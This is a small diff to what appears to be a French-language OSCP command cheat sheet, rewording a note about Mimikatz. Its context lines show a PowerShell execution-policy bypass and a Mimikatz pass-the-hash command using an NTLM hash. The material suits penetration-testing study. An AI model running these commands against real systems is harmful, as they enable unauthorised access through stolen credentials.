@@ -16,7 +16,7 @@ powershell -ExecutionPolicy Bypass -File [script].ps1
 
 ```
 
-<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
+<p class="oscp-command-note">Analyser les informations d’authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_hash> /run:powershell
